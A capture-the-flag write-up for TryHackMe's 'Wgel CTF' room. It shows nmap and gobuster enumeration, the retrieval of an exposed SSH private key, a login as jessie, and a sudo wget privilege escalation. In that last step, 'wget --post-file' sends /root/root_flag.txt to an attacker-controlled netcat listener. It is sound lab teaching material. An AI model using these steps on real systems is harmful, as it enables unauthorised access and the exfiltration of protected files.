# Wgel CTF

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Easy
OS: Linux
Subscription type: Free
Description: Can you exfiltrate the root flag?
```

Room link: [https://tryhackme.com/r/room/wgelctf](https://tryhackme.com/r/room/wgelctf)

## Solution

### Check for services with nmap

We start by scanning the machine with `nmap`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Wgel_CTF]
└─$ nmap -v -sV -sC 10.10.84.138 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-18 15:12 CEST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:12
Completed NSE at 15:12, 0.00s elapsed
Initiating NSE at 15:12
Completed NSE at 15:12, 0.00s elapsed
Initiating NSE at 15:12
Completed NSE at 15:12, 0.00s elapsed
Initiating Ping Scan at 15:12
Scanning 10.10.84.138 [2 ports]
Completed Ping Scan at 15:12, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:12
Completed Parallel DNS resolution of 1 host. at 15:12, 0.00s elapsed
Initiating Connect Scan at 15:12
Scanning 10.10.84.138 [1000 ports]
Discovered open port 22/tcp on 10.10.84.138
Discovered open port 80/tcp on 10.10.84.138
Completed Connect Scan at 15:12, 0.67s elapsed (1000 total ports)
Initiating Service scan at 15:12
Scanning 2 services on 10.10.84.138
Completed Service scan at 15:12, 6.25s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.84.138.
Initiating NSE at 15:12
Completed NSE at 15:12, 1.90s elapsed
Initiating NSE at 15:12
Completed NSE at 15:12, 0.17s elapsed
Initiating NSE at 15:12
Completed NSE at 15:12, 0.00s elapsed
Nmap scan report for 10.10.84.138
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 15:12
Completed NSE at 15:12, 0.00s elapsed
Initiating NSE at 15:12
Completed NSE at 15:12, 0.00s elapsed
Initiating NSE at 15:12
Completed NSE at 15:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.45 seconds
```

We have two services running:

- OpenSSH 7.2p2 on port 22
- Apache httpd 2.4.18 on port 80

### Manually browse to the web site

Manually browsing to port 80 shows a `Apache2 Ubuntu Default Page`.  
On the page we find this comment

```text
 <!-- Jessie don't forget to udate the webiste -->
```

### Check for files/directories with gobuster

Next, we check for files/directories on the web service with `gobuster`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Wgel_CTF]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x html,php,txt -u http://10.10.84.138 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.84.138
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 11374]
/index.html           (Status: 200) [Size: 11374]
/server-status        (Status: 403) [Size: 277]
/sitemap              (Status: 301) [Size: 314] [--> http://10.10.84.138/sitemap/]
Progress: 18456 / 18460 (99.98%)
===============================================================
Finished
===============================================================
```

Let's continue scanning the `/sitemap` directory

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Wgel_CTF]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x html,php,txt -u http://10.10.84.138/sitemap                 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.84.138/sitemap
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.84.138/sitemap/.ssh/]
/about.html           (Status: 200) [Size: 12232]
/blog.html            (Status: 200) [Size: 12745]
/contact.html         (Status: 200) [Size: 10346]
/css                  (Status: 301) [Size: 318] [--> http://10.10.84.138/sitemap/css/]
/fonts                (Status: 301) [Size: 320] [--> http://10.10.84.138/sitemap/fonts/]
/images               (Status: 301) [Size: 321] [--> http://10.10.84.138/sitemap/images/]
/index.html           (Status: 200) [Size: 21080]
/index.html           (Status: 200) [Size: 21080]
/js                   (Status: 301) [Size: 317] [--> http://10.10.84.138/sitemap/js/]
/services.html        (Status: 200) [Size: 10131]
/shop.html            (Status: 200) [Size: 17257]
/work.html            (Status: 200) [Size: 11428]
Progress: 18456 / 18460 (99.98%)
===============================================================
Finished
===============================================================
```

### Check out the /sitemap/.ssh directory

Manually browsing to `http://10.10.84.138/sitemap/.ssh/` shows a directory listing with the file `id_rsa`.

![Directory listing on Wgel machine](Images/Directory_listing_on_Wgel_machine.png)

Let's assume the private SSH key belongs to the `jessie` user and download it

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Wgel_CTF]
└─$ curl http://10.10.84.138/sitemap/.ssh/id_rsa -o jessie_id_rsa                                      
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1675  100  1675    0     0  18381      0 --:--:-- --:--:-- --:--:-- 18406
```

### Login with SSH as jessie

Now we ought to be able to login with SSH as `jessie`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Wgel_CTF]
└─$ chmod 600 jessie_id_rsa                                      

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Wgel_CTF]
└─$ ssh -i jessie_id_rsa jessie@10.10.84.138
The authenticity of host '10.10.84.138 (10.10.84.138)' can't be established.
ED25519 key fingerprint is SHA256:6fAPL8SGCIuyS5qsSf25mG+DUJBUYp4syoBloBpgHfc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.84.138' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ 
```

And we are in.

### Get the user flag

Next, we can search for the user flag with `find`

```bash
jessie@CorpOne:~$ find . -type f -name [Uu]ser* 2>/dev/null
./.local/share/keyrings/user.keystore
./.config/user-dirs.locale
./.config/user-dirs.dirs
./.config/dconf/user
./Documents/user_flag.txt
jessie@CorpOne:~$ cat Documents/user_flag.txt 
0<REDACTED>6
```

### Enumeration

We now start enumerating for ways to escalate our privileges.  
First we check if we can run any commands as root via `sudo`

```bash
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

We can execute `/usr/bin/wget`.

### Get the root flag

We will POST the flag to our local machine so we start a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Wgel_CTF]
└─$ nc -lvnp 12345                                                  
listening on [any] 12345 ...

```

The we transfer the root flag

```bash
jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.14.61.233:12345
--2024-09-18 17:06:38--  http://10.14.61.233:12345/
Connecting to 10.14.61.233:12345... connected.
HTTP request sent, awaiting response... 
```

Back at the netcat listener we end the connection with `CTRL + C`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Wgel_CTF]
└─$ nc -lvnp 12345                                                  
listening on [any] 12345 ...
connect to [10.14.61.233] from (UNKNOWN) [10.10.84.138] 42786
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.14.61.233:12345
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b<REDACTED>d
^C
```

And there we have the flag!

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [Gobuster - Github](https://github.com/OJ/gobuster/)
- [Gobuster - Kali Tools](https://www.kali.org/tools/gobuster/)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [wget - GTFOBins](https://gtfobins.github.io/gtfobins/wget/)
- [wget - Linux manual page](https://man7.org/linux/man-pages/man1/wget.1.html)
